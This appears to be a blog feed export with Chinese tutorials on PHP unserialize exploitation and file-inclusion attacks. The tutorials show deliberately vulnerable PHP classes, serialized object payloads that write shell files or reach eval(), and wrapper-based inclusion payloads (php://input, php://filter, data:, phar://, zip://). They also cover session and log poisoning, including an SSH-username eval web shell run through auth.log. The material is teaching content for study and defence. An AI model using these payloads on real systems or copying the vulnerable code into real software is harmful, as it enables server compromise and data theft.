<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $test = <span class="string">"aaa"</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"__wakeup()函数已被调用"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"__construct()函数已被调用"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"__destruct()函数已被调用"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$class1 = <span class="string">'O:1:"a":1:&#123;s:4:"test";s:3:"aaa";&#125;'</span>;</span><br><span class="line">print_r($class1);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">$class1_unser = unserialize($class1);</span><br><span class="line">print_r($class1_unser);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果如下：</p>
<img src="/2020/01/21/php反序列化漏洞——unserialize/3.png">

<p>因为没有创建对象，所以构造函数<strong>construct()不会被调用，但是</strong>wakeup()跟__destruct()函数</p>
<h4 id="wakeup-或destruct-的利用"><a href="#wakeup-或destruct-的利用" class="headerlink" title="wakeup()或destruct()的利用"></a><strong><strong>wakeup()或</strong>destruct()的利用</strong></h4><p>因为unserialize()后<strong>wakeup()或</strong>destruct()会直接调用，中间无需其他的过程。因此最好的情况就是一些漏洞/危害代码在<strong>wakeup()或</strong>destruct()中，从而当我们控制序列化字符串时可以直接取触发它们。如：</p>
<p>通过serialize()得到我们要的序列化字符串，之后再传进去。通过源代码得知，把对象test赋值为”<?php phpinfo(); ?>“，再调用unserialize()时会通过__wakeup()把$test写入shell.php中。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $test = <span class="string">'aaa'</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$fp = fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>);</span><br><span class="line">		fwrite($fp, <span class="keyword">$this</span> -&gt; test);</span><br><span class="line">		fclose($fp);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$class1 = <span class="keyword">new</span> a();</span><br><span class="line">$class1 -&gt; test = <span class="string">"&lt;?php phpinfo(); ?&gt;"</span>;</span><br><span class="line">$class1_ser = serialize($class1);</span><br><span class="line">print_r($class1_ser);</span><br><span class="line"><span class="keyword">print</span>(<span class="string">"&lt;/br&gt;"</span>);</span><br><span class="line">$class1_unser = unserialize($class1_ser);</span><br><span class="line">print_r($class1_unser);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<img src="/2020/01/21/php反序列化漏洞——unserialize/4.png">

<p>shell.php文件</p>
<img src="/2020/01/21/php反序列化漏洞——unserialize/5.png">

<p>成功写入shell.php文件</p>
<p>但具体的环境多是下面代码这样，我们的test是我们可控的参数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $test = <span class="string">'aaa'</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$fp = fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>);</span><br><span class="line">		fwrite($fp, <span class="keyword">$this</span> -&gt; test);</span><br><span class="line">		fclose($fp);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$class1 = $_GET[<span class="string">'test'</span>];</span><br><span class="line">print_r($class1);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">$class1_unser = unserialize($class1);</span><br><span class="line"><span class="keyword">require</span> <span class="string">"shell.php"</span>;</span><br><span class="line"><span class="comment">//为显示效果，把这个shell.php包含进来</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>利用上述代码生成参数O:1:”a”:1:{s:4:”test”;s:18:”<?php phpinfo();?>“;}</p>
<p>传如参数得：</p>
<img src="/2020/01/21/php反序列化漏洞——unserialize/6.png">

<h4 id="其他Magic-function的利用"><a href="#其他Magic-function的利用" class="headerlink" title="其他Magic function的利用"></a>其他Magic function的利用</h4><p>有时候反序列化一个对象时，由它调用的__wakeup()中又去调用了其他的对象，由此可以溯源而上，最后找到漏洞点。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($test)</span></span>&#123;</span><br><span class="line">		$fp = fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>);</span><br><span class="line">		fwrite($fp, $test);</span><br><span class="line">		fclose($fp);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $test = <span class="string">'aaa'</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$obj = <span class="keyword">new</span> a(<span class="keyword">$this</span> -&gt; test);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$class1 = $_GET[<span class="string">'test'</span>];</span><br><span class="line">print_r($class1);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">$class1_unser = unserialize($class1);</span><br><span class="line"><span class="keyword">require</span> <span class="string">"shell.php"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里我们给test传入构造好的序列化字符串后，进行反序列化时自动调用 <em>\</em>wakeup()函数，从而在new joker()会自动调用对象joker中的<em>\</em>construct()方法，从而把<?php phpinfo();?>写入到shell.php中：</p>
<img src="/2020/01/21/php反序列化漏洞——unserialize/7.png">

<h3 id="利用普通成员方法"><a href="#利用普通成员方法" class="headerlink" title="利用普通成员方法"></a>利用普通成员方法</h3><p>前面谈到的利用都是基于“自动调用”的magic function。但当漏洞/危险代码存在类的普通方法中，就不能指望通过“自动调用”来达到目的了。这时的利用方法如下，寻找相同的函数名，把敏感函数和类联系在一起</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $test;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span> -&gt; test = <span class="keyword">new</span> b();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span> -&gt; test -&gt; action();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"b"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">c</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $test2;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; test2);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$class1 = <span class="keyword">new</span> a();</span><br><span class="line">unserialize($_GET[<span class="string">'test'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>本意上，new一个新的a对象后，调用<strong>construct()，其中有new了一个b对象。结束后会调用</strong>destruct()，其中会调用action()，从而输出 b。</p>
<img src="/2020/01/21/php反序列化漏洞——unserialize/8.png">

<p>利用过程，构造序列化：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $test;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span> -&gt; test = <span class="keyword">new</span> c();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">c</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $test2 = <span class="string">"phpinfo();"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> a());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>得</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:<span class="string">"a"</span>:1:&#123;s:4:<span class="string">"test"</span>;O:1:<span class="string">"c"</span>:1:&#123;s:5:<span class="string">"test2"</span>;s:10:<span class="string">"phpinfo();"</span>;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>传给test.php，成功利用：</p>
<img src="/2020/01/21/php反序列化漏洞——unserialize/9.png">
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[PHP文件包含漏洞]]></title>
      <url>/2019/11/22/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><p>php中引发文件包含漏洞的通常是以下四个函数：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.include()</span><br><span class="line">2.include_once()</span><br><span class="line">3.require()</span><br><span class="line">4.require_once()</span><br><span class="line">5.file_get_contents()</span><br><span class="line">6.readfile()</span><br></pre></td></tr></table></figure>

<h3 id="以上前4个函数的区别"><a href="#以上前4个函数的区别" class="headerlink" title="以上前4个函数的区别"></a>以上前4个函数的区别</h3><p>include() 如果出错的话，只会提出警告，会继续执行后续语句。<br>reuqire() 如果在包含的过程中有错，比如文件不存在等，则会直接退出，不执行后续语句。</p>
<p>include_once()、require_once()功能与上述两者几乎相同。不同的是如果一个文件已经被包含了，则不会被再次包含，以此避免函数重定义或者变量重新赋值等问题。</p>
<p>利用这四个函数所包含的文件都会被直接作为php文件进行解析。</p>
<h4 id="test1"><a href="#test1" class="headerlink" title="test1"></a>test1</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">	<span class="keyword">include</span> $file;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>若在同一目录下有文件info.txt，内容为 <strong><?php phpinfo(); ?></strong> 那么访问：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxxx?file=info.txt</span><br></pre></td></tr></table></figure>

<p>即可成功解析phpinfo</p>
<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="LFI-Local-File-Inclusion"><a href="#LFI-Local-File-Inclusion" class="headerlink" title="LFI(Local File Inclusion)"></a>LFI(Local File Inclusion)</h3><p>本地文件包含漏洞，即是指能打开并包含本地文件的漏洞。<br>test1即为本地文件包含漏洞</p>
<h3 id="RFI-Remote-File-Inclusion"><a href="#RFI-Remote-File-Inclusion" class="headerlink" title="RFI(Remote File Inclusion)"></a>RFI(Remote File Inclusion)</h3><p>远程文件包含漏洞，即是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。<br>但 <strong>RFI(Remote File Inclusion)</strong> 的利用需要条件，在php.ini中进行配置</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.allow_url_fopen = On</span><br><span class="line">2.allow_url_include = On</span><br></pre></td></tr></table></figure>

<p>当两个配置均开启时，才能够远程包含文件成功</p>
<p>phpini中， <strong>allow_url_fopen = On</strong> 默认时一直为On，但 <strong>allow_url_include</strong> 从php5.2之后就默认为off</p>
<h2 id="包含技巧"><a href="#包含技巧" class="headerlink" title="包含技巧"></a>包含技巧</h2><p>下面例子中测试代码均为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>.php：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">	<span class="keyword">include</span> $file;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">info.txt：</span><br><span class="line"><span class="meta">&lt;?</span> phpinfo() <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>allow_url_fopen 默认为 On<br>allow_url_include 默认为 Off</strong></p>
<p>若有特殊要求，会在利用条件里指出</p>
<h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><p>利用条件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.allow_url_include = On</span><br><span class="line">2.对allow_url_fopen不做要求</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xxx/include.php?file=php://input</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>

<img src="/2019/11/22/文件包含漏洞/1.jpg" width="1">

<h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><p>这个是一个过滤器，里面的过滤方法很多，我们如果不想执行被包含的代码，我们就可以使用base64 编码输出，通常用来读取源码</p>
<p>php://filter 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include.php?file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=flag.txt</span><br></pre></td></tr></table></figure>

<img src="/2019/11/22/文件包含漏洞/2.jpg">
<p>通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。<br><strong>index.php?file=php://filter/convert.base64-encode/resource=index.php</strong><br>效果跟前面一样，少了read等关键字。在绕过一些waf时也许有用</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">resource=&lt;要过滤的数据流&gt;     这个参数是必须的，且必须位于 php://filter 的末尾，并且指向需要过滤筛选的数据流。</span><br><span class="line"><span class="built_in">read</span>=&lt;读链的筛选列表&gt;     该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">write=&lt;写链的筛选列表&gt;     该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">&lt;；两个链的筛选列表&gt;     任何没有以 <span class="built_in">read</span>= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</span><br></pre></td></tr></table></figure>

<img src="/2019/11/22/文件包含漏洞/3.jpg">
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">注意点：</span><br><span class="line">**(1)记住一旦使用了 <span class="built_in">read</span> 选项，我们就值关心数据流的来源，这里的数据流的来源就是 resource 传入的，至于经过过滤器以后这个数据流要去哪里，这不是我们这个处理能决定的，还要依赖外部的函数**</span><br><span class="line">**(2)一旦使用了 write 选项，我们就只关系数据的输出，数据的输出就是我们指定的 resource 的文件，而数据的输入要靠外部的函数帮我们实现**</span><br><span class="line">**(3)我们的过滤是按照过滤器从左到右的顺序进行的，不要错误地认为是从右到左**</span><br></pre></td></tr></table></figure>

<h5 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h5><p><strong>(1)字符串过滤器</strong></p>
<p>|:————:|:————-:|<br>|string.rot13|进行rot13转换|<br>|string.toupper|将字符全部大写|<br>|string.tolower|将字符全部小写|<br>|string.strip_tags|去除空字符、HTML 和 PHP 标记后的结果|</p>
<p><strong>(2)转换过滤器</strong></p>
<p>|:————:|:————-:|<br>|convert.base64-encode|base64 编码|<br>|convert.base64-decode|base64 解码|<br>|convert.quoted-printable-encode|quoted-printable 编码（也是另一种将二进制进行编码的方案）|<br>|convert.quoted-printable-decode|quoted-printable 解码|<br>|convert.iconv|实现任意两种编码之间的转换|</p>
<p><strong>(3)压缩过滤器</strong></p>
<p>|:————:|:————-:|<br>|zlib.deflate|压缩过滤器|<br>|zlib.inflate|解压过滤器|<br>|bzip2.compress|压缩过滤器|<br>|bzip2.decompress|解压过滤器|</p>
<p><strong>(4)加密过滤器</strong></p>
<p>|:————:|:————-:|<br>|mcrypt.<em>|加密过滤器|<br>|mdecrypt.</em>|解密过滤器|</p>
<p><strong>实例</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">readfile(“php://filter/resource=http://www.example.com<span class="string">");</span></span><br><span class="line"><span class="string">readfile(“php://filter/read=string.toupper/resource=http://www.example.com"</span>);</span><br><span class="line">readfile(“php://filter/<span class="built_in">read</span>=string.toupper|string.rot13/resource=http://www.example.com<span class="string">");</span></span><br><span class="line"><span class="string">file_put_contents(“php://filter/write=string.rot13/resource=example.txt”,”Hello World”);</span></span><br></pre></td></tr></table></figure>

<p><strong>特别提一下这个过滤器convert.iconv</strong></p>
<p>这个过滤器能实现几乎任意的两种编码之间的转化</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php://filter/<span class="built_in">read</span>=convert.iconv.UTF-8%2FASCII%2F%2FTRANSLIT/resource=...</span><br><span class="line">convert.iconv.ISO-8859-1/UTF-8</span><br><span class="line">php://filter/convert.iconv.UTF-8%2fUTF-7/resource=</span><br></pre></td></tr></table></figure>

<h3 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h3><p>利用条件：<strong>php版本大于等于php5.3.0</strong></p>
<p>假设有个文件info.txt，其内容为<?php phpinfo(); ?>，将其打包为zip压缩包</p>
<p>指定绝对路径</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include.php?file=phar://D:/software/phpstudy/PHPTutorial/WWW/<span class="built_in">test</span>/info.zip/info.txt</span><br></pre></td></tr></table></figure>

<p>或者使用相对路径（这里test.zip就在当前目录下）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include.php?file=phar://info.zip/info.txt</span><br></pre></td></tr></table></figure>

<img src="/2019/11/22/文件包含漏洞/4.jpg">

<h4 id="使用phar-拓展php反序列化攻击面"><a href="#使用phar-拓展php反序列化攻击面" class="headerlink" title="使用phar://拓展php反序列化攻击面"></a>使用phar://拓展php反序列化攻击面</h4><h3 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h3><p>利用条件：<strong>php版本大于等于php5.3.0</strong></p>
<p>构造zip包的方法与phar相同</p>
<p>但使用zip协议，需要指定绝对路径，注意url编码,因为这个 # 会和url协议中的 # 冲突，将 # 编码为 %23 ，之后加上压缩包内的问件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include.php?file=zip://D:/software/phpstudy/PHPTutorial/WWW/<span class="built_in">test</span>/info.zip%23info.txt</span><br></pre></td></tr></table></figure>

<h3 id="data-URL-schema"><a href="#data-URL-schema" class="headerlink" title="data:URL schema"></a>data:URL schema</h3><p>数据流封装器，和php://相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的；</p>
<p>和php伪协议的input类似</p>
<p>利用条件：<br>    1.php版本大于等于php5.2<br>    2.allow_url_fopen = On<br>    3.allow_url_include = On</p>
<h4 id="data-text-plain"><a href="#data-text-plain" class="headerlink" title="data:text/plain"></a>data:text/plain</h4><p>输出直接显示在相应的URL中，显示参数：data:text/plain。<br>然后你需要执行如下所示的php代码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include.php?file=data:text/plain,&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<img src="/2019/11/22/文件包含漏洞/6.jpg">

<p>执行命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include.php?file=data:text/plain,&lt;?php system(<span class="string">'whoami'</span>);?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="data-text-plain-base64"><a href="#data-text-plain-base64" class="headerlink" title="data:text/plain;base64"></a>data:text/plain;base64</h4><p>有另一种方法来使用data: text/plain; base64，不过此时你需要使用base64编码来执行PHP代码，base64php代码如下所示：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure>

<img src="/2019/11/22/文件包含漏洞/7.jpg">
<p>其中加号+的url编码为%2b，PD9waHAgcGhwaW5mbygpOz8+的base64解码为：<?php phpinfo();?></p>
<h3 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h3><p>利用条件：session文件路径已知，且其中内容部分可控</p>
<p>php的session文件的保存路径可以在phpinfo的session.save_path看到</p>
<p>常见的php-session存放位置：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1./var/lib/php/sess_PHPSESSID</span><br><span class="line">2./var/lib/php/sess_PHPSESSID</span><br><span class="line">3./tmp/sess_PHPSESSID</span><br><span class="line">4./tmp/sessions/sess_PHPSESSID</span><br></pre></td></tr></table></figure>

<p>session的文件名格式为sess_[phpsessid]。而phpsessid在发送的请求的cookie字段中可以看到</p>
<img src="/2019/11/22/文件包含漏洞/8.jpg">

<p>要包含并利用的话，需要能控制部分sesssion文件的内容。暂时没有通用的办法。有些时候，可以先包含进session文件，观察里面的内容，然后根据里面的字段来发现可控的变量，从而利用变量来写入payload，并之后再次包含从而执行php代码</p>
<h3 id="包含日志"><a href="#包含日志" class="headerlink" title="包含日志"></a>包含日志</h3><h4 id="访问日志"><a href="#访问日志" class="headerlink" title="访问日志"></a>访问日志</h4><p>利用条件：需要知道服务器日志的存储路径，且日志文件可读</p>
<p><strong>开启日志</strong></p>
<img src="/var/log/apache2/" class="9.jpg} 很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在" title="但如果是直接发起请求，会导致一些符号被编码使得包含无法正确解析。可以使用burp截包后修改 {% asset_img /2019/11/22/文件包含漏洞/10.jpg">



<h4 id="SSH-log"><a href="#SSH-log" class="headerlink" title="SSH log"></a>SSH log</h4><p>利用条件：需要知道ssh-logd位置，且可读。<br>默认情况下为/var/log/auth.log</p>
<p>用ssh连接：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh <span class="string">'&lt;?php @eval($_GET['</span>dd<span class="string">']) ?&gt;'</span>@remotehost</span><br></pre></td></tr></table></figure>

<p>提示输入密码随便输入即可。</p>
<p>然后在remotehost的ssh-log中即可写入php代码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include.php?file=/var/<span class="built_in">log</span>/auth.log&amp;dd=ifconfig</span><br></pre></td></tr></table></figure>

<h3 id="包含environ"><a href="#包含environ" class="headerlink" title="包含environ"></a>包含environ</h3><p>利用条件：<br>    1.php以cgi方式运行，这样environ才会保持UA头<br>    2.environ文件存储位置已知，且environ文件刻度</p>
